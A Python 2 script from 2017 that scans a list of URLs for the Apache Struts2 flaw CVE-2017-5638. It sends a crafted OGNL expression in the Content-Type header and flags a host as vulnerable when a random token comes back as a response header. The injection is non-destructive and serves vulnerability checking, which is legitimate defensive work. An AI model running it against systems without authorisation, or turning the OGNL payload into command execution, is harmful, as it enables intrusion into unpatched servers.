
'''
Created on 12 Mar 2017
@author: Jr.Rombaldo
'''
# import urllib2
# from urllib2 import URLError, HTTPError
from random import randint
import sys
import requests
from requests import exceptions


# CUSTOMIZATION
_timeout_read = 7
_timeout_connect = 15
_header_name = 'STRUTS2-VALIDATION'
_user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'

_max_url_size = 0

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'

# disable SSL messages: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised.
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print '\r\n\r\n', HEADER
print '\t\t######################################################'
print '\t\t######### CVE-2017-5638 - STRUTS2 Validation #########'
print '\t\t######################################################', ENDC
print '\r\n'

def printError(exp, msg, url, has_incap, code):
    if type(exp) == exceptions.SSLError:
        error = str(exp)
    else:
        error = exp.__class__.__name__

    print WARNING, '%-12s' % ('[' + msg + ']'), ENDC, ('%-' + str(_max_url_size - 1) + 's') % (url), code, OKBLUE, has_incap, ENDC, error


def validate(app_url):
    body = status_code = has_incap = str_header = ''
    vulnerable = False
    url = app_url
    

#     https://blog.qualys.com/laws-of-vulnerabilities/2017/03/11/apache-struts-jakarta-qid-11771-for-detecting-cve-2017-5638
    token = randint(10000000, 99999999)
    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('" + _header_name + "', " + str(token) + ")}.multipart/form-data"

        
    try:
        headers = {'User-Agent': _user_agent, 'Content-Type': payload}
        response = requests.get(url=app_url, headers=headers, params={}, allow_redirects=False, timeout=(_timeout_read, _timeout_connect), verify=False)
        status_code = response.status_code
        url = response.url
        body = response.text
        
        # grabbing Incapsula header
        if str(response.headers).lower().find("incap") > -1: has_incap = '[INCAPSULA]'
       
        # grabbing returned toke
        token_received = response.headers.get(_header_name)
        str_header = 'Injected:{0} Received:{1}'.format(token, token_received)
        
        # is the inject header present on response?
        if str(token) == token_received:   
            vulnerable = True
       
        if  vulnerable:
            print FAIL, '%-12s' % ("[VULNERABLE]"), ENDC, ('%-' + str(_max_url_size) + 's') % (url), status_code, OKBLUE, has_incap, ENDC, str_header
        else:
            print OKGREEN, '%-12s' % ("[SECURE]"), ENDC, ('%-' + str(_max_url_size) + 's') % (url), status_code, OKBLUE, has_incap, ENDC, str_header
        
        
        
#     http://docs.python-requests.org/en/master/_modules/requests/exceptions/
#     http://docs.python-requests.org/en/master/api/#exceptions
    except exceptions.ProxyError as exp:
        printError(exp, 'TIMED_OUT', url, has_incap, status_code)
        
    except exceptions.SSLError as exp:
        printError(exp, 'SSL_ERR', url, has_incap, status_code)
        
    except (exceptions.Timeout , exceptions.ConnectTimeout , exceptions.ReadTimeout) as exp:
         printError(exp, 'TIMED_OUT', url, has_incap, status_code)
         
    except (exceptions.URLRequired , exceptions.MissingSchema , exceptions.InvalidSchema, exceptions.InvalidURL) as exp:
        printError(exp, 'INVALID_URL', url, has_incap, status_code)
        
#     except exceptions.RequestsWarning as exp:
#          printError(exp, 'WARNING', url, has_incap, status_code)
         
    except exceptions.ConnectionError as exp:
        printError(exp, 'CONNECT_ERR', url, has_incap, status_code)

    except exceptions.RequestException as exp:
          printError(exp, 'REQ_ERR', url, has_incap, status_code)
        
    except Exception as exp:
       printError(exp, 'GENERIC_ERR', url, has_incap, status_code)
    
    
    return body, url, status_code



if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "usage: ", sys.argv[0], "application_list_file"
        exit()
        
    with open(sys.argv[1]) as f:
        appList = f.read().splitlines()

        # capturing the max url len to adjust the line sizes
        for app in appList:
            if len(app) > _max_url_size: _max_url_size = len(app)

        for app in appList:
            if not str(app).startswith("#") and len(app) > 3:
                validate(app)
